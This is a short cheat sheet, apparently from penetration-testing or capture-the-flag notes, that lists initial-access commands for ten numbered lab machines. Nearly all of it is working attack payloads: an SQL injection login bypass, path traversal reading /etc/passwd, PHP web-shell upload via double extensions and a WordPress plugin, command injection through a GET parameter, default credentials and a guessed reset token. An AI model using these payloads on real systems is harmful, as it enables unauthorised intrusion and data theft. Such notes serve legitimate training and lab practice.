## 🔓 Initial Access (Machines 171–180)

```bash
# Machine 171
# Web-based login bypass using SQLi
curl -X POST http://<IP>/login -d "username=admin' -- &password=anything"

# Machine 172
# Exploit public CVE in vulnerable CMS
searchsploit CMS Made Simple
exploit-db 46635

# Machine 173
# Directory traversal for sensitive file access
curl http://<IP>/index.php?page=../../../../etc/passwd

# Machine 174
# Upload bypass using double extensions
mv shell.php shell.jpg.php

# Machine 175
# Reused credentials on SSH from exposed admin panel
ssh admin@<IP> -p 2222

# Machine 176
# WordPress plugin exploit for RCE
wpscan --url http://<IP> --enumerate p
curl -F "file=@shell.php" http://<IP>/wp-content/plugins/vulnerable/upload.php

# Machine 177
# Leaked credentials in backup archive
binwalk -e backup.tar
cat config.php

# Machine 178
# Default login on admin panel
username: admin
password: admin123

# Machine 179
# Command injection through GET parameter
curl "http://<IP>/ping.php?host=8.8.8.8;id"

# Machine 180
# Email-based account reset + predictable token
curl http://<IP>/reset?token=abcd1234
```
